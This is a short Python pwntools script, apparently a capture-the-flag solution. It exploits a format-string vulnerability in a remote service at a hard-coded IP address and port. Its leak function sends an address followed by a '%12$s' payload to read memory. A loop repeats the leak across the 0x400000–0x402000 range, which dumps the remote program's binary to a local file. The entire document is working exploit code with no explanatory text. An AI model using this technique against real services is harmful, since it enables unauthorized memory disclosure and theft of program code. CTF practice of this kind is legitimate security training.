#! /usr/bin/env python
# -*- coding: utf-8 -*-
# vim:fenc=utf-8
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>
#
# Distributed under terms of the MIT license.

from pwn import *
context.log_level = "error"
pool = []

def leak(add):
    if "\x0a" in p64(add):
        return "\x00"
    r = remote("58.20.46.147",37725)
    r.sendlineafter("number:","aa"+p64(add))
    r.sendlineafter("give me your str:","%12$sGG\x00")
    d1 = r.recvuntil("GG")[:-2]
    r.close()
    return d1

pool = []
off = 0x400000
while off < 0x402000:
	tmp = leak(off)
	off +=len(tmp)+1
	pool.append(tmp)

with open("elf","w+") as f:
	f.write("\x00".join(pool))

